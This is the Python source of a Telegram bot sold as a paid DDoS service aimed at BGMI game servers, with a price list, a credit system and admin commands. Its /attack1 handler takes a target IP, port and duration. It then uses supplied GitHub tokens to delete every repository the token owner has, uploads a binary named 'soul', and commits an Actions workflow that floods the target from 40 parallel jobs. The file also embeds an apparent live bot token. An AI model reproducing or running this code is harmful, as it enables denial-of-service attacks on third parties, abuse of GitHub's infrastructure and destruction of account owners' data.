import os
import asyncio
import base64
import json
import telebot
import subprocess
import requests
import datetime
from datetime import datetime
from github import Github, InputGitTreeElement, Auth

# Insert your Telegram bot token here
bot = telebot.TeleBot('8219744399:AAED0KnuAyhxTjGHTjBEJ7uD_CKguHtSHsU')

# Admin user IDs
admin_id = ["5599402910"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store user sessions (credits and tokens)
DATA_FILE = 'soul.json'

# GitHub configuration
REPO_NAME = "soulcrack90"
CREDIT_COST_PER_ATTACK = 25
VBV_LOADING_FRAMES = [
    "🟦 [■□□□□]",
    "🟦 [■■□□□]",
    "🟦 [■■■□□]",
    "🟦 [■■■■□]",
    "🟦 [■■■■■]",
]

SOUL_YML_TEMPLATE = '''name: Run Soul 50x
on: [push]
jobs:
  soul:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40]
    steps:
      - uses: actions/checkout@v3
      - name: Make binary executable
        run: chmod +x soul
      - name: Run soul binary
        run: ./soul {ip} {port} {time} 900 -1
'''

# Load user sessions
user_sessions = {}
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        try:
            user_sessions = json.load(f)
            for session in user_sessions.values():
                if 'approved' in session and isinstance(session['approved'], list):
                    session['approved'] = set(session['approved'])
        except Exception:
            user_sessions = {}

def save_data():
    to_save = {}
    for k, v in user_sessions.items():
        copy_sess = v.copy()
        if 'approved' in copy_sess and isinstance(copy_sess['approved'], set):
            copy_sess['approved'] = list(copy_sess['approved'])
        to_save[k] = copy_sess
    with open(DATA_FILE, 'w') as f:
        json.dump(to_save, f)

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response) 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Only Admin Can Run This Command.")
        return
        
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /approve <id> <credit>")
        return
        
    id_to_approve = command[1]
    try:
        credit = int(command[2])
        if credit <= 0:
            raise ValueError()
    except Exception:
        bot.reply_to(message, "Credit must be a positive integer")
        return
        
    # Initialize user session if not exists
    if user_id not in user_sessions:
        user_sessions[user_id] = {'credits': {}, 'approved': set()}
    
    session = user_sessions[user_id]
    session.setdefault('credits', {})
    session.setdefault('approved', set())
    session['credits'][id_to_approve] = credit
    session['approved'].add(id_to_approve)
    save_data()
    
    bot.reply_to(message, f"Approved ID {id_to_approve} with {credit} credits.")

@bot.message_handler(commands=['credit'])
def add_credit(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Only Admin Can Run This Command.")
        return
        
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /credit <id> <credit>")
        return
        
    id_to_credit = command[1]
    try:
        credit = int(command[2])
        if credit <= 0:
            raise ValueError()
    except Exception:
        bot.reply_to(message, "Credit must be a positive integer")
        return
        
    if user_id not in user_sessions or id_to_credit not in user_sessions[user_id].get('credits', {}):
        bot.reply_to(message, f"ID {id_to_credit} is not yet approved.")
        return
        
    user_sessions[user_id]['credits'][id_to_credit] += credit
    save_data()
    
    bot.reply_to(message, f"Added {credit} credits to ID {id_to_credit}. Total: {user_sessions[user_id]['credits'][id_to_credit]}")

@bot.message_handler(commands=['token'])
def set_token(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Only Admin Can Run This Command.")
        return
        
    command = message.text.split()
    if len(command) < 2:
        bot.reply_to(message, "Usage: /token <token1> <token2> ...")
        return
        
    tokens = command[1:]
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
        
    user_sessions[user_id]['github_tokens'] = tokens
    save_data()
    
    bot.reply_to(message, f"Stored {len(tokens)} GitHub token(s).")

@bot.message_handler(commands=['status'])
def show_status(message):
    user_id = str(message.chat.id)
    if user_id not in user_sessions:
        bot.reply_to(message, "No approved IDs.")
        return
        
    session = user_sessions[user_id]
    approved = session.get('approved', set())
    credits = session.get('credits', {})
    
    if not approved:
        bot.reply_to(message, "No approved IDs.")
        return
        
    lines = ["Approved IDs and credits:"]
    for id_ in approved:
        c = credits.get(id_, 0)
        lines.append(f"ID: {id_} — Credits: {c}")
    
    bot.reply_to(message, "\n".join(lines))

# Function to handle the GitHub attack
def run_github_attack(chat_id, github_token, ip, port, time, id_):
    try:
        # Make sure binary is executable
        os.system("chmod +x soul")
        
        # Initialize GitHub with token
        g = Github(auth=Auth.Token(github_token))
        user = g.get_user()
        
        # Clean up existing repos
        try:
            repos = user.get_repos()
            for repo in repos:
                if repo.owner.login == user.login:
                    repo.delete()
        except Exception:
            pass
            
        # Create new repo
        repo = user.create_repo(REPO_NAME, private=True, auto_init=True)
        branch = repo.default_branch or "main"
        base_ref = repo.get_git_ref(f"heads/{branch}")
        base_commit = repo.get_git_commit(base_ref.object.sha)
        base_tree = repo.get_git_tree(base_commit.sha)
        
        # Add binary to repo
        with open("soul", "rb") as f:
            binary_content = f.read()
        binary_b64 = base64.b64encode(binary_content).decode('utf-8')
        blob = repo.create_git_blob(binary_b64, "base64")
        
        binary_element = InputGitTreeElement(
            path="soul",
            mode='100755',
            type='blob',
            sha=blob.sha,
        )
        
        new_tree = repo.create_git_tree([binary_element], base_tree)
        new_commit = repo.create_git_commit("Add soul binary", new_tree, [base_commit])
        base_ref.edit(new_commit.sha)
        
        # Add workflow
        base_ref = repo.get_git_ref(f"heads/{branch}")
        base_commit = repo.get_git_commit(base_ref.object.sha)
        base_tree = repo.get_git_tree(base_commit.sha)
        
        yml_content = SOUL_YML_TEMPLATE.format(ip=ip, port=port, time=time)
        yml_element = InputGitTreeElement(
            path=".github/workflows/soul.yml",
            mode='100644',
            type='blob',
            content=yml_content,
        )
        
        workflow_tree = repo.create_git_tree([yml_element], base_tree)
        workflow_commit = repo.create_git_commit("Add workflow", workflow_tree, [base_commit])
        base_ref.edit(workflow_commit.sha)
        
        return True
    except Exception as e:
        print(f"Error in GitHub attack: {e}")
        return False

# Function to handle the reply when users run the /attack1 command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY HELLA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy @Shadow_lScript"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /attack1 command
bgmi_cooldown = {}

# Handler for /attack1 command
@bot.message_handler(commands=['attack1'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @Shadow_lScript"
        bot.reply_to(message, response)
        return
        
    # Check if user has GitHub tokens set
    if user_id not in user_sessions or 'github_tokens' not in user_sessions[user_id] or not user_sessions[user_id]['github_tokens']:
        response = "Admin must set GitHub token(s) first with /token. Power By @Shadow_lScript"
        bot.reply_to(message, response)
        return
        
    # Check if user has approved IDs
    if user_id not in user_sessions or 'approved' not in user_sessions[user_id] or not user_sessions[user_id]['approved']:
        response = "No approved IDs to run attack on. Use /approve first. Power By @Shadow_lScript"
        bot.reply_to(message, response)
        return
        
    command = message.text.split()
    if len(command) != 4:
        response = "Usage :- /attack1 <target> <port> <time>\nBy @Shadow_lScript"
        bot.reply_to(message, response)
        return
        
    target, port, time_s = command[1], command[2], command[3]
    
    try:
        time_int = int(time_s)
        if time_int <= 0:
            raise ValueError()
    except Exception:
        response = "Time must be a positive integer"
        bot.reply_to(message, response)
        return
        
    # Check cooldown for non-admins
    if user_id not in admin_id:
        if user_id in bgmi_cooldown:
            time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
            if time_since_last_attack < 300:
                remaining_time = 300 - time_since_last_attack
                response = f"You are on cooldown. Please wait {remaining_time} seconds before running the /attack1 command again."
                bot.reply_to(message, response)
                return
        # Update the last time the user ran the command
        bgmi_cooldown[user_id] = datetime.datetime.now()
    
    # Check if binary exists
    if not os.path.isfile("soul"):
        response = "Local binary 'soul' not found!"
        bot.reply_to(message, response)
        return
        
    # Show loading animation
    loading_msg = bot.send_message(message.chat.id, f"{VBV_LOADING_FRAMES[0]}  0% completed")
    
    frame_count = len(VBV_LOADING_FRAMES)
    for i, frame in enumerate(VBV_LOADING_FRAMES):
        percentage = int(((i + 1) / frame_count) * 100)
        display_message = f"{frame}  {percentage}% completed"
        try:
            bot.edit_message_text(display_message, message.chat.id, loading_msg.message_id)
        except Exception:
            pass
        
    # Run the attack
    record_command_logs(user_id, '/attack1', target, port, time_int)
    log_command(user_id, target, port, time_int)
    start_attack_reply(message, target, port, time_int)
    
    # Check credits and run attack for each approved ID
    session = user_sessions[user_id]
    approved_ids = session.get('approved', set())
    credits = session.get('credits', {})
    github_tokens = session.get('github_tokens', [])
    
    success_count = 0
    for id_ in list(approved_ids):
        credit = credits.get(id_, 0)
        if credit < CREDIT_COST_PER_ATTACK:
            continue
            
        # Deduct credit
        credits[id_] = credit - CREDIT_COST_PER_ATTACK
        
        # Run attack with each token
        for token in github_tokens:
            if run_github_attack(user_id, token, target, port, time_int, id_):
                success_count += 1
    
    # Save updated credits
    user_sessions[user_id]['credits'] = credits
    save_data()
    
    if success_count > 0:
        response = f"✅ Attack successfully launched with {success_count} workflows! Power By @soulcrack_owner"
    else:
        response = "No IDs with enough credit to start attack."
    
    try:
        bot.edit_message_text(response, message.chat.id, loading_msg.message_id)
    except Exception:
        bot.send_message(message.chat.id, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /attack1 : Method For Bgmi Servers. 
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.
 /status : Show approved IDs and their credits

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 By STORM BOT
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @Shadow_lScript"
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
By STORM BOT'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip :
-> Attack Time : 200 (S)
> After Attack Limit : 2 Min
-> Concurrents Attack : 300

Pr-ice List:
per match--> 30 Rs
per hours--> 50 Rs
Day--------> 250 Rs
Week-------> 900 Rs
Month------> 1600 Rs
LifeTimes--> 2000 Rs
By STORM BOT
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
/approve <id> <credit> - Approve ID with credit
/credit <id> <credit> - Add credit to ID
/token <token1> <token2> ... - Provide GitHub tokens
/status - Show approved IDs and their credits
By @Shadow_lScript
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

# Start the bot
if __name__ == "__main__":
    print("Bot is running...")
    bot.polling(none_stop=True)
